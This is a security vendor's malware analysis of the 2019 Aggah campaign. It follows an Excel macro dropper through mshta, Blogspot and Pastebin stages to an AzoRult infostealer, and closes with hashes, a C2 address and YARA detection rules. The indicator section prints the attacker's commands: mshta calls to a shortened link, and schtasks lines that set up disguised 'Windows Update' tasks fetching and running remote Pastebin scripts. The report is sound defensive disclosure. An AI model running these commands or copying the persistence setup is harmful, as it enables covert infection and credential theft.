# Reference for threat actor for "Aggah"

**Title**: APT or not APT? What's Behind the Aggah Campaign - Yoroi

**Source**: https://yoroi.company/research/apt-or-not-apt-whats-behind-the-aggah-campaign/

## Content







APT or not APT? What's Behind the Aggah Campaign - Yoroi











































































 












Home






Defence center






Threat intelligence






Solutions







Before Attack







Technologies







Threat intelligence






DNS Defence






Kanwa






Genku






Digital Surveillance








Services







Infrastructure & Systems compliance






Scam Protection






SCADA Security






Early Warning






Wi-Fi Infrastructure Assessment






Vulnerability Assessment






Adversarial Simulation






Threat Hunting






SIEM management






Security Infrastructure Assessment (SIA)






Penetration Testing










During Attack







Technologies







Threat intelligence






Kanwa






Yomi






Email Protection








Services







IRT (Incident Response Team)






Managed Advanced Threat Protection






KickBack Attack










After Attack







Technologies







Threat intelligence






Kanwa








Services







Wi-Fi Infrastructure Assessment






Threat Hunting












Blogs







Yoroi Blog






Marco Ramilli Blog








Downloads






About us






Contacts






English







Italiano






APT or not APT? What's Behind the Aggah Campaign
	09/24/2019
Introduction
During our threat monitoring activities, we discovered an interesting drop chain related to the well-known Aggah campaign, the ambiguous infection chain observed by Unit42 which seemed to deliver payloads potentially associated with the Gorgon Group APT. After that, we discovered other malicious activities using the same TTPs and infrastructures, for instance in “The Enigmatic “Roma225” Campaign” and “The Evolution of Aggah: From Roma225 to the RG Campaign” reports. 
But, despite the very similar infection chain, this latest attacks revealed a curious variation of the final payload, opening up to different interpretations and hypothesis about the “Aggah” activities.
Technical Analysis
Hash7f649548b24721e1a0cff2dafb7269741ff18b94274ac827ba86e6a696e9de87ThreatExcel document DropperBrief DescriptionFirst stage of Aggah campaignSsdeep768:4Sk3hOdsylKlgxopeiBNhZFGzE+cL2kdAJrqYtAd/fBuzPRtUb:hk3hOdsylKlgxopeiBNhZFGzE+cL2kd3
Table 1. Sample’s information
As in most infections, the multi-stage chain starts with a weaponized Office document containing VBA macro code. It immediately appears obfuscated and after a de-obfuscation phase, we discovered it invokes the following OS command:
mshta.exe http://bit[.ly/8hsshjahassahsh
The bit.ly link redirects on the attacker’s page hosted on Blogspot at hxxps://myownteammana.blogspot[.com/p/otuego4thday.html. This is the typical Aggah modus operandi. In fact, the webpage source code contains a JavaScript snippet designed to be executed by the MSHTA engine.
Figure 1. HTA script hidden into Blogspot page

Figure 2. Deobfuscated HTA script
This script is obfuscated using a combination of URL-encoding and string reversing. Once again, the script is only a dropper that downloads the next malicious stage hosted on PasteBin. Like the previous Aggah campaigns, the pastes were created by the “hagga” account. This stage is designed to kill the Office suite processes and to create a new registry key to achieve persistence on the target system. This way the hagga dropper would survive the reboot.
Figure 3. Another obfuscated Javascript snippet
In detail, the malware uses three mechanisms to ensure its persistence on the victim machine:
the creation of a new task called “Windows Update” that triggers every 60 minutes; the creation of another task called “Update” that triggers every 300 minutes;the setting of “HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate” registry key;
Each entry contact pastebin.com to download and execute further payload. The interesting fact is that the URL referred by tasks and regkey are different from each other, so the attacker is able to deliver more than a payload by just changing one of the pastes.
Figure 4. Code used to set persistence
During the analysis, all the three URL pointed to the same script, which is reported in the following screen. The cleaned code reveals a byte array composing Powershell commands. It downloads two other snippets from Pastebin. 
Figure 5. Deobfuscation process

Figure 6. Powershell script used to inject the final payload in legit process
The first one corresponds to the “Hackitup” DLL file, previously discussed in our previous report. The second paste is the final payload. In many other Aggah campaigns it corresponds to RevengeRAT, which could also be linked to the Gorgon Group. However, during the analysis we identified another kind of final stage. 
The AzoRult Payload
Hash37086a162bebaecba466b3706acea19578d99afd2adf1492a074536aa7c742c1ThreatAzoRult Brief DescriptionAzoRult final payloadSsdeep3072:tuOSXpMx7ZAlHsbfUkolNGti7lfqeSxM3SpyEY3E/qxg/:Zzx7ZApszolIo7lf/ipT/q
Table 3. Sample’s information
This time, the final payload was a variant of a popular infostealer for sale on the dark markets, AzoRult. It is able to access to saved credentials of the major browser like Chromium, Firefox, Opera, Vivaldi to exfiltrate cookies, credentials and other navigation data.
Figure 7. AzoRult tries to extract info from browsers files
Having a deeper look to the command and control infrastructure we noticed some interesting details. In fact, we discovered the particular, customized, AzoRult 3.2 fork called “Mana Tools”. At the same time, reviewing the infection chain data revealed the presence of a reference to this “Mana” customization even in the blogspot page abused in the first steps of the chain. 
Figure 8. Blogspot page (on the left); “Mana” logo related to AzoRult C2

Conclusion
We have monitored the campaign and its final payload for different days finding the attacker delivered AzoRult samples only a few times, during the first days of September 2019, and after that it resumed to deliver RevengeRAT samples.
The “Mana” campaign opens to a series of hypothesis about the threat actor behind it. According to Palo Alto Networks, the “Aggah” infection chain could have been used by GorgonGroup too, but with a different payload. So, it is possible that Gorgon added this particular AzoRult version to their arsenal, maybe to retrieve initial information about its initial victims or to increase their recon capabilities. But the confidence in this scenario is not high enough to confirm it. Another possibility is that another minor cyber criminal leveraged the Aggah infection chain to deliver his AzoRult payload, which is a commodity malware, or also the actors behind the “Hagga” Pastebin account used their own infection chain to conduct its own attack campaign. Many question only further hunting could answer.
Indicator of Compromise
Hashes7f649548b24721e1a0cff2dafb7269741ff18b94274ac827ba86e6a696e9de8784833991f1705a01a11149c9d037c8379a9c2d463dc30a2fec27bfa52d218fa637086a162bebaecba466b3706acea19578d99afd2adf1492a074536aa7c742c1c2d594e23480215c94dc7f79cf50af3b3b4270fa3a60aea81f877bd787a684a4a318ce12ddd1b512c1f9ab1280dc25a254d2a1913e021ae34439de9163354243cfd1363ce16156e55460b29bf4d62045ebcd5180af50d732c2353daf12618c18Persistenceschtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /Fschtasks /create /sc MINUTE /mo 300 /tn ""Update"" /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /FHKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdateC2hxxp://170.130.205.86/index.php
Yara Rules
import "pe"
rule Mana_Aggah_campaign_excel_dropper_Sep_2019{

    meta:
      description = "Yara Rule for Mana campaign Excel dropper"
      author = "Cybaze Zlab_Yoroi"
      last_updated = "2019-09-18"
      tlp = "white"
      category = "informational"

    strings:
   		 $a1 = {64 68 61 73 6A 00 6B 68 64 61 6B 6A 73 68 00 64 6B 61 28 29}
   		 $a2 = {61 70 74 77 4D 71 55 45 27}

    condition:
   	 all of them
}


rule Mana_Aggah_campaign_injector_Sep_2019{

    meta:
      description = "Yara Rule for Mana campaign DLL injector"
      author = "Cybaze Zlab_Yoroi"
      last_updated = "2019-09-18"
      tlp = "white"
      category = "informational"

    strings:
   		 $a1 = {4D 5A}
   		 $a2 = {93 E5 21 3F 59 AE}
   		 $a3 = {11 08 28 22}
   		 $a4 = "v2.0.507"
   		 $a5 = {E2 80 8C E2 80}
   		 $a6 = {81 AC E2 81 AF E2 80 AE}
   		 $a7 = {E2 81 AA E2 80}
   		 $a8 = {81 AF E2 80 AA}
   		 $a9 = {81 AC E2 81 AF E2 80 AE}
   		 $a10 = {C5 C7 4C 9E 65 A5 B6 42}

    condition:
   	 6 of ($a*)
}

rule Mana_Aggah_campaign_AzoRult_Sep_2019{

    meta:
      description = "Yara Rule for Mana campaign AzoRult sample"
      author = "Cybaze Zlab_Yoroi"
      last_updated = "2019-09-18"
      tlp = "white"
      category = "informational"

    strings:
		$h1 = {4D 5A 50}
		$bob1 = {55 8B EC 83 C4 F0 B8 ?? ?? ?? ?? E8}
		$bob2 = {55 8B EC 83 C4 F0 53 56 B8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 33 C0 55 68 ?? ?? ?? ?? 64 FF 30 64 89 20 B8}
		$bob3 = {55 8B EC 83 C4 F0 53 B8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 33 C0 55 68 ?? ?? ?? ?? 64 FF 30 64 89 20 B8 ?? ?? ?? ?? E8}
		$s1 = "SOFTWARE\\Borland\\Delphi\\RTL" ascii wide
		$s2 = "moz_historyvisits.visit_date" ascii wide
		$s3 = "\\BitcoinCore_custom\\wallet.dat" ascii wide
	condition:
		$h1 and all of ($s*) and 1 of ($bob*)
}

This blog post was authored by Antonio Farina and Luca Mella of Cybaze-Yoroi Z-LAB
SeatYoroi S.r.l.Piazza Sallustio, 900187 Roma (RM)Contact[email protected]+39 051 0301005LegalTerms & ConditionsMOG D.Lgs 231/01Privacy PolicyCookie PolicyCode of Ethics andConductWarning systemSubscribe to our early warning systemDownloadsNewsSocialP.IVA. 03407741200 - R.E.A. RM 1559639 - Codice Fiscale 03407741200 - Capitale Sociale: Euro 100.000 IVYoroi S.r.l. società soggetta ad attività di direzione e coordinamento esercitata dalla Tinexta S.p.A.credits: SimpleNetworks
 
×Subscribe to our early warning system

 











Name *




Last Name *




Company *




Email *




Details






Dichiaro di aver letto e compreso l’informativa privacy resa ai sensi dell’art. 13 e autorizzo il Titolare del trattamento alla raccolta dei miei dati personali secondo le modalità e per le finalità ivi descritte.






Autorizzo il Titolare del trattamento alla raccolta dei miei dati personali secondo le modalità descritte nell’informativa privacy per l’invio di comunicazioni commerciali e/o promozionali anche tramite l’invio di newsletter














 


Questo sito, come la maggior parte dei siti web, utilizza cookie, anche di terze parti, per migliorare la tua esperienza di navigazione e raccogliere informazioni sull'utilizzo del sito stesso. Cliccando su "Accetta tutti" ti dichiari d'accordo all'utilizzo di cookie analitici (che ci aiutano a capire in che modo gli utenti usano il sito e come migliorarlo, insieme ai nostri servizi) e di tracciamento (inclusi quelli di nostri partner di fiducia) che ci aiutano a decidere quali prodotti mostrarti, a misurare il volume di visite sul nostro sito e a darti la possibilità di mettere "mi piace" e di condividere contenuti direttamente sui social media. Clicca qui per vedere a cosa hai dato il tuo consenso e trovare più informazioni sui cookie che utilizziamo.Read MoreGestisci ImpostazioniRifiuta TuttiAccetta tutti  Manage consent




Close






Privacy Overview 
Questo sito, come la maggior parte dei siti web, utilizza cookie, anche di terze parti, per migliorare la tua esperienza di navigazione e raccogliere informazioni sull'utilizzo del sito stesso.

 





								Necessary							


Necessary

Always Enabled




									I cookie funzionali contribuiscono al buon funzionamento del nostro sito e ti permettono di creare un account, accedere e gestire le tue prenotazioni. Questi cookie ricordano la lingua e la valuta che hai selezionato, le tue ricerche passate e altre preferenze. Si tratta di cookie tecnici che devono essere attivati per poter utilizzare il nostro sito e i nostri servizi.
CookieDurationDescription_GRECAPTCHA5 months 27 daysThis cookie is set by the Google recaptcha service to identify bots to protect the website against malicious spam attacks.cookielawinfo-checkbox-advertisement1 yearSet by the GDPR Cookie Consent plugin, this cookie is used to record the user consent for the cookies in the "Advertisement" category .cookielawinfo-checkbox-analytics11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Analytics".cookielawinfo-checkbox-functional11 monthsThe cookie is set by GDPR cookie consent to record the user consent for the cookies in the category "Functional".cookielawinfo-checkbox-necessary11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookies is used to store the user consent for the cookies in the category "Necessary".cookielawinfo-checkbox-others11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Other.cookielawinfo-checkbox-performance11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Performance".pll_language1 yearThe pll _language cookie is used by Polylang to remember the language selected by the user when returning to the website, and also to get the language information when not available in another way.viewed_cookie_policy11 monthsThe cookie is set by the GDPR Cookie Consent plugin and is used to store whether or not user has consented to the use of cookies. It does not store any personal data. 






								Performance							


Performance





									Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.
								






								Marketing							


Marketing





									Questo sito e i nostri partner di fiducia usano cookie di terze parti per mostrare messaggi pubblicitari personalizzati su questo sito e su altri siti in base alla tua cronologia di navigazione. Questi cookie vengono usati per integrare i social media sul nostro sito, in modo che tu possa mettere "mi piace" sulle nostre pagine o sui nostri prodotti e condividerli sui social.
CookieDurationDescriptionVISITOR_INFO1_LIVE5 months 27 daysA cookie set by YouTube to measure bandwidth that determines whether the user gets the new or old player interface.YSCsessionYSC cookie is set by Youtube and is used to track the views of embedded videos on Youtube pages.yt-remote-connected-devicesneverYouTube sets this cookie to store the video preferences of the user using embedded YouTube video.yt-remote-device-idneverYouTube sets this cookie to store the video preferences of the user using embedded YouTube video.yt.innertube::nextIdneverThis cookie, set by YouTube, registers a unique ID to store data on what videos from YouTube the user has seen.yt.innertube::requestsneverThis cookie, set by YouTube, registers a unique ID to store data on what videos from YouTube the user has seen. 






								Others							


Others





									Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.
								






								Analytics							


Analytics





									I cookie analitici ci aiutano a capire in che modo i clienti come te utilizzano questo sito. In questo modo possiamo migliorare il sito, le app e le comunicazioni e assicurarci di offrire sempre contenuti interessanti e rilevanti.
CookieDurationDescription_gat_gtag_UA_209986505_11 minuteSet by Google to distinguish users.CONSENT2 yearsYouTube sets this cookie via embedded youtube-videos and registers anonymous statistical data. 












SAVE & ACCEPT


Powered by 





















        mobile-menu-eng 


Home







Defence center







Threat intelligence







Solutions



     Solutions  


Before Attack



     Before Attack  


Technologies



     Technologies  


Threat intelligence







DNS Defence







Kanwa







Genku







Digital Surveillance




 Back 



Services



     Services  


Infrastructure & Systems compliance







Scam Protection







SCADA Security







Early Warning







Wi-Fi Infrastructure Assessment







Vulnerability Assessment







Adversarial Simulation







Threat Hunting







SIEM management







Security Infrastructure Assessment (SIA)







Penetration Testing




 Back 
 Back 



During Attack



     During Attack  


Technologies



     Technologies  


Threat intelligence







Kanwa







Yomi







Email Protection




 Back 



Services



     Services  


IRT (Incident Response Team)







Managed Advanced Threat Protection







KickBack Attack




 Back 
 Back 



After Attack



     After Attack  


Technologies



     Technologies  


Threat intelligence







Kanwa




 Back 



Services



     Services  


Wi-Fi Infrastructure Assessment







Threat Hunting




 Back 
 Back 
 Back 



Blogs



     Blogs  


Yoroi Blog







Marco Ramilli Blog




 Back 



Downloads







About us







Contacts







English



     English  


Italiano




 Back 
© 2020 credits: SimpleNetworks     menu-it 


Defence center







Solutions



    Back   Solutions  


Before Attack



    Back   Before Attack  


Technologies



    Back   Technologies  


Threat intelligence







DNS Defence







Kanwa







Genku







Digital Surveillance








Services



    Back   Services  


Infrastructure & Systems compliance







Scam Protection







SCADA Security







Early Warning







Wi-Fi Infrastructure Assessment







Vulnerability Assessment







Adversarial Simulation







Threat Hunting







SIEM management







Security Infrastructure Assessment (SIA)







Penetration Testing









During Attack



    Back   During Attack  


Technologies



    Back   Technologies  


Threat intelligence







Kanwa







Yomi







Email Protection








Services



    Back   Services  


IRT (Incident Response Team)







Managed Advanced Threat Protection







KickBack Attack









After Attack



    Back   After Attack  


Technologies



    Back   Technologies  


Threat intelligence







Kanwa








Services



    Back   Services  


Wi-Fi Infrastructure Assessment







Threat Hunting










Blogs



    Back   Blogs  


Yoroi Blog







Marco Ramilli Blog








Home







Downloads







About us









linkedin





facebook



pinterest



youtube



rss



twitter



instagram





facebook-blank



rss-blank



linkedin-blank



pinterest



youtube



twitter



instagram



































